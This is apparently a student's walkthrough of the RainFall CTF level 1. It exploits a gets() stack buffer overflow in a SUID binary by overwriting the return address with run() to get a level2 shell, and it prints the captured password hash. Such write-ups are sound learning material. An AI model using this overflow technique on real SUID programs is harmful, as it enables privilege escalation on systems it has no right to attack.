1)))))))))))))))))))))))))

level1@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

That means SUID bit is set. When we run ./level1, it runs with the privileges of level2, not level1.
So even though we are level1, the program runs as level2.

2))))))))))))))))))))))))))

let's check the functions inside GDB

gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init                                             Internal System Functions (Not Useful)
0x08048340  gets                                              Library Functions
0x08048340  gets@plt
0x08048350  fwrite                                            Library Functions
0x08048350  fwrite@plt
0x08048360  system                                            Library Functions
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main                                 Internal System Functions (Not Useful)
0x08048380  __libc_start_main@plt
0x08048390  _start                                            Internal System Functions (Not Useful)
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy                                       Internal System Functions (Not Useful)
0x08048444  run                                               Custom Functions (Interesting!)
0x08048480  main                                              Custom Functions (Interesting!)
0x080484a0  __libc_csu_init                                   Internal System Functions (Not Useful)
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux





Inside main() we saw: gets() is extremely dangerous because: It reads input, It keeps reading until newline, It DOES NOT check buffer size.
"The gets() function is a deprecated and unsafe C standard library function used to read a line of text from the standard input (stdin). It is no longer part of the official C11 standard and subsequent ones due to a critical security vulnerability."

So if the buffer is 64 bytes… And we send 200 bytes… It will happily overwrite everything. caled: "Stack Buffer Overflow"
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


By overwriting the RET value with the address of run() we can force its execution.

1) 
-----------------------------
Find Offset to Return Address
-----------------------------

level1@RainFall:~$ python -c 'print "A"*100' > /tmp/test
level1@RainFall:~$ gdb ./level1 

(gdb) run < /tmp/test
Starting program: /home/user/level1/level1 < /tmp/test

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()                                                       means AAAA


✔ Our input reached the return address
✔ We have control



64 (buffer)
+ 4 (saved EBP)
+ 4 (return address overwrite position)
= 72 bytes to reach EIP

we know that from gdb main: 
The first instruction allocate 80 bytes on the stack 
The second one takes 16 bytes for temparory storage 

2) 

Now we want to execute the function run() because it calls system(0x8048584)

and the address 0x8048584 contains "bin/sh", we can check that using the command : 
x/s 0x8048584

(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"

so the porpuse now is to make the main() function calls the run() function, and the run() function will open the shell so we can find our password


0x08048444  is the address of run()

Now we should go to the return address and overwrite it:

64 buffer
+4 saved EBP
+4 reach return address
+4 overwrite EIP


level1@RainFall:~$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
level1@RainFall:~$ cat /tmp/exploit | ./level1
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami 
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77


